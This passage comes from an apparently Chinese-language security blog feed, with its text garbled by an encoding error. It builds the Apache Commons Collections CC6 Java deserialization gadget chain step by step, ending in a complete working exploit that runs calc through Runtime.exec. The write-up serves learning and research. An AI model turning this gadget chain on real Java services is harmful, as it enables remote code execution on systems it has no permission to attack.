</span><br><span class="line">        Class&lt;LazyMap&gt; mapClass = LazyMap.class;  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">classDeclaredMethod</span> <span class="operator">=</span> mapClass.getDeclaredMethod(<span class="string">&quot;get&quot;</span>, Object.class);  </span><br><span class="line">        classDeclaredMethod.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        classDeclaredMethod.invoke(map,r);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸‹ä¸€æ­¥å°±æ˜¯ç»§ç»­æ‰¾å“ªé‡Œè°ƒç”¨äº†getæ–¹æ³•ï¼Œçœ‹äº†åˆ©ç”¨é“¾ï¼Œä¸‹ä¸€ä¸ªç±»å’Œæ–¹æ³•æ˜¯<code>TiedMapEntry</code> ç±»ä¸­çš„ <code>getValue()</code>æ–¹æ³•ï¼Œè¿™ä¸ªé‡Œé¢è°ƒç”¨äº† <code>LazyMap</code> çš„ <code>get()</code> æ–¹æ³•ï¼Œç„¶åç»§ç»­ç¼–å†™EXPç¡®ä¿ç›®å‰é“¾å­å¯ç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  </span><br><span class="line">        <span class="comment">//ä¼ å…¥LazyMapå°±å’Œåé¢è¿èµ·æ¥äº†ï¼Œå³è°ƒç”¨çš„æ˜¯LazyMapçš„getæ–¹æ³•  </span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key&quot;</span>);  </span><br><span class="line">        tiedMapEntry.getValue();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¼¹å‡ºæˆåŠŸ<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071430104.png" alt="image-20230507143003991"><br>ç„¶åå°±æ˜¯ç»§ç»­å¾€ä¸Šæ‰¾ï¼Œçœ‹è°è°ƒç”¨äº† <code>TiedMapEntry</code> ä¸­çš„ <code>getValue()</code> æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•æ¯”è¾ƒå¸¸è§ï¼Œæ‰€ä»¥å°±æ˜¯å…ˆçœ‹åŒç±»ä¸‹æœ‰æ²¡æœ‰è°ƒç”¨ï¼Œæœ€åå‘ç°åŒç±»ä¸‹çš„hashCodeæ–¹æ³•è°ƒç”¨äº†<code>getValue()</code> æ–¹æ³•<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071430087.png" alt="image-20230507143025027"><br>è€Œæ‰¾åˆ°hashCodeæ–¹æ³•åå°±æ˜¯æ‰¾è°è°ƒç”¨äº†hashCodeæ–¹æ³•ï¼Œä½†æ˜¯è¿™é‡Œæˆ‘ä»¬ä¸ç”¨ç»§ç»­æ‰¾äº†ï¼Œå› ä¸ºåœ¨Javaååºåˆ—åŒ–ä¸­hashCodeæ–¹æ³•åé¢çš„åˆ©ç”¨é“¾åŸºæœ¬éƒ½æ˜¯ä¸‹é¢è¿™æ¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xxx.readObject()</span><br><span class="line">HashMap.put() --è‡ªåŠ¨è°ƒç”¨--&gt;   HashMap.hash()</span><br><span class="line">åç»­åˆ©ç”¨é“¾.hashCode()</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071430291.png" alt="image-20230507143036238"><br>ç„¶ååˆ©ç”¨hashæ–¹æ³•å†™exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  </span><br><span class="line">        <span class="comment">//ä¼ å…¥LazyMapå°±å’Œåé¢è¿èµ·æ¥äº†ï¼Œå³è°ƒç”¨çš„æ˜¯LazyMapçš„getæ–¹æ³•  </span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key&quot;</span>);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="comment">//putæ–¹æ³•é‡Œé¢ä¼šè°ƒç”¨hashæ–¹æ³•  </span></span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;value&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åçœ‹ä¸€ä¸‹ç°åœ¨çš„EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  </span><br><span class="line">        <span class="comment">//ä¼ å…¥LazyMapå°±å’Œåé¢è¿èµ·æ¥äº†ï¼Œå³è°ƒç”¨çš„æ˜¯LazyMapçš„getæ–¹æ³•  </span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="comment">//putæ–¹æ³•é‡Œé¢ä¼šè°ƒç”¨hashæ–¹æ³•  </span></span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);  </span><br><span class="line">        serialize(expMap);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æ³¨é‡Šæ‰ååºåˆ—åŒ–åè¿˜æ˜¯èƒ½å¼¹å‡ºè®¡ç®—å™¨ï¼Œè¿™è‚¯å®šæ˜¯æœ‰é—®é¢˜çš„ï¼Œè¿™é‡Œå’ŒURLDNSçš„æ€æƒ³å…¶å®å·®ä¸å¤šï¼Œåœ¨æ‰§è¡Œ <code>put()</code> æ–¹æ³•çš„æ—¶å€™ï¼Œé‡Œé¢ä¹Ÿä¼šæ‰§è¡Œhashæ–¹æ³•ä½†æ˜¯è¦çš„æ˜¯readObjecté‡Œé¢çš„putValä¸­è°ƒç”¨çš„hashæ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä¿®æ”¹ä¸‹é¢è¿™æ¡è¯­å¥çš„å‚æ•°å³</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,chainedTransformer);</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆåœ¨åºåˆ—åŒ–çš„æ—¶å€™ä¼ è¿›å»ä¸€ä¸ªæ²¡ç”¨çš„å‚æ•°ï¼Œç„¶åååºåˆ—åŒ–çš„æ—¶å€™å†é‡æ–°èµ‹å€¼å°±è¡Œï¼Œæ”¹ä¸ºä¸‹é¢è¿™æ ·</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,<span class="keyword">new</span>  <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p>putå®Œä¹‹åé€šè¿‡åå°„å†æ”¹å›æ¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;  </span><br><span class="line"><span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);  </span><br><span class="line">factoryField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">factoryField.set(lazyMap,chainedTransformer);</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æ”¹å®Œä¹‹åååºåˆ—åŒ–ä¹Ÿä¸å¼¹è®¡ç®—å™¨äº†ï¼Œä¸‹ä¸ªæ–­ç‚¹è°ƒè¯•ä¸€ä¸‹<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071430225.png" alt="image-20230507143052175"><br>æœ€ç»ˆé—®é¢˜å‡ºåœ¨LazyMapä¸‹çš„getæ–¹æ³•<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071431873.png" alt="image-20230507143107809"><br>putçš„æ—¶å€™ä¼šä¼ å…¥ä¸€ä¸ªkeyååºåˆ—åŒ–æ— æ³•è¿›å…¥ifæ‰§è¡Œtransformæ–¹æ³•ï¼Œæ‰€ä»¥éœ€è¦åˆ æ‰è¿™ä¸ªkey</p><h2 id="æœ€ç»ˆEXP"><a href="#æœ€ç»ˆEXP" class="headerlink" title="æœ€ç»ˆEXP"></a>æœ€ç»ˆEXP</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,<span class="keyword">new</span>  <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));  </span><br><span class="line">        <span class="comment">//ä¼ å…¥LazyMapå°±å’Œåé¢è¿èµ·æ¥äº†ï¼Œå³è°ƒç”¨çš„æ˜¯LazyMapçš„getæ–¹æ³•  </span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="comment">//putæ–¹æ³•é‡Œé¢ä¼šè°ƒç”¨hashæ–¹æ³•ï¼Œä½†æ˜¯æˆ‘ä»¬è¦çš„æ˜¯putValé‡Œé¢çš„hashæ–¹æ³•å¯¹keyè¿›è¡Œè®¡ç®—  </span></span><br><span class="line">        <span class="comment">//æ‰€ä»¥å°±éœ€è¦é€šè¿‡åå°„å¯¹putæ”¹å€¼ï¼Œè®©ä»–ä¸è§¦å‘è¿™æ¡é“¾  </span></span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);  </span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);  </span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        serialize(expMap);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071431402.png" alt="image-20230507143122325"><br>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªç‚¹å°±æ˜¯ideaçš„è®¾ç½®é—®é¢˜ï¼Œåœ¨ IDEA è¿›è¡Œ debug è°ƒè¯•çš„æ—¶å€™ï¼Œä¸ºäº†å±•ç¤ºå¯¹è±¡çš„é›†åˆï¼Œä¼šè‡ªåŠ¨è°ƒç”¨ <code>toString()</code> æ–¹æ³•ï¼Œæ‰€ä»¥åœ¨åˆ›å»º <code>TiedMapEntry</code> çš„æ—¶å€™ï¼Œå°±è‡ªåŠ¨è°ƒç”¨äº† <code>getValue()</code> æœ€ç»ˆå°†é“¾å­èµ°å®Œï¼Œç„¶åå¼¹å‡ºè®¡ç®—å™¨ï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œå¦‚ä¸‹ä¿®æ”¹<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071431521.png" alt="image-20230507143138470"><br>è®¾ç½®æˆè¿™æ ·å°±è¡Œ</p><h2 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xxx.readObject()</span><br><span class="line">HashMap.put()</span><br><span class="line">HashMap.hash()</span><br><span class="line">TiedMapEntry.hashCode()</span><br><span class="line">TiedMapEntry.getValue()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><h2 id="æµç¨‹å›¾"><a href="#æµç¨‹å›¾" class="headerlink" title="æµç¨‹å›¾"></a>æµç¨‹å›¾</h2><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071431635.png" alt="image-20230507143149592"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™æ¡é“¾å­å‚è€ƒåšå®¢è·Ÿåˆ°ä¸€åŠæä¸æ‡‚äº†ç„¶åå»çœ‹ç™½æ—¥æ¢¦ç»„é•¿çš„è§†é¢‘åˆç†äº†ä¸€ä¸‹æ‰å®Œæˆè¿™æ¡é“¾å­ï¼Œä¸å¾—ä¸è¯´ç™½æ—¥æ¢¦ç»„é•¿è®²çš„ç¡®å®ç»†</p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub--DC-1</title>
      <link href="/2023/05/Vulnhub-DC-1/"/>
      <url>/2023/05/Vulnhub-DC-1/</url>
      
